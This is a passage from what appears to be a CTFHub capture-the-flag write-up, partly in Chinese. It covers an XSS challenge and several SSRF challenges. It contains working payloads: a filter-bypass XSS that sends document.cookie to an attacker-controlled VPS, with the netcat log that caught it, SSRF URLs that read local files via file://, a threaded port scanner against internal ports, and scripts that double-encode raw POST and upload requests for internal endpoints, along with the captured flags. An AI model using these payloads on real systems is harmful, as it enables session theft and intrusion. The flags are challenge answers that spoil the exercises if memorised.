bob</h1><imimgg src=x ononerrorerror="alert(1)"><h1>emm
```

```
bob</h1>
<imimgg src=x ononerrorerror="fetch('http://YOUR_VPS_ADDR:1111/'+escape(document.cookie))"><h1>emm
```

```
root@-6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 62145 received!
GET /flag%3Dctfhub%7B926b6edd12dc83ff9f4f8d29%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: */*
Origin: http://challenge-9d951f4923096fbb.sandbox.ctfhub.com:10800
Referer: http://challenge-9d951f4923096fbb.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

flag: `ctfhub{926b6edd12dc83ff9f4f8d29}`

### SSRF - 内网访问

```
http://challenge-ed3e196ba3bb7a32.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php
```

flag: `ctfhub{6cb292d1e9cae393ef545516}`

### SSRF - 伪协议读取文件

```
http://challenge-4b6547d8234d78c8.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
```

flag: `ctfhub{b32e088b3d1c052ad448a974}`

### SSRF - 端口扫描

```python
import requests
import queue
import threading
import time

import requests.adapters

urls = [f"http://challenge-d143edf32bd6d1cf.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:{port}" for port in range(8000, 9000)]

retry_strategy = requests.adapters.Retry(total=3, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET"])
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)

stop_event = threading.Event()

qu = queue.Queue()
for url in urls: qu.put(url)

num_threads = 6

def worker() -> None:
    while not qu.empty() and not stop_event.is_set():
        url = qu.get()
        resp = session.get(url)
        if resp.headers.get('Content-Length') != '0':
            stop_event.set()
            print(f"Found: {url}")
            break
        print(f"\r{len(urls) - qu.qsize()}/{len(urls)}", end='')

def main() -> None:
    threads = [threading.Thread(target=worker) for _ in range(num_threads)]
    for thread in threads: thread.start()
    for thread in threads: thread.join()

if __name__ == '__main__':
    main()
```

flag: `ctfhub{dd96c7727790ed6e30630ade}`

### SSRF - POST 请求

先读取源代码

```
http://challenge-c67d7344553cd3c4.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php
```

```php
<?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

```
http://challenge-c67d7344553cd3c4.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
```

```php
<?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>

<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=<?php echo $key;?>-->
</form>
```

构造请求：，然后 urlencode 两次

```python
from urllib.parse import quote

payload: str = """POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=54f8ae799cfcbe8bec4af0f3d5c43bcb
"""

def main() -> None:
    out = payload.replace('\n', '\r\n')
    out = quote(out)
    out = quote(out)
    print(out)

if __name__ == '__main__':
    main()
```

flag: `ctfhub{750677e121b4809a5aa7dd71}`

### SSRF - 上传文件

```python
from urllib.parse import quote

payload: str = """POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: multipart/form-data; boundary=BOUNDARY
Content-Length: 120

--BOUNDARY
Content-Disposition: form-data; name="file"; filename="file"
Content-Type: text/plain

123
--BOUNDARY--
"""

def main() -> None:
    out = payload.replace('\n', '\r\n')
    out = quote(out)
    out = quote(out)
    print(out)

if __name__ == '__main__':
    main()
```

flag: `ctfhub{a6723782f8ad2c52604d0def}`

### SSRF - FastCGI 协议


### SSRF - 数字 IP bypass

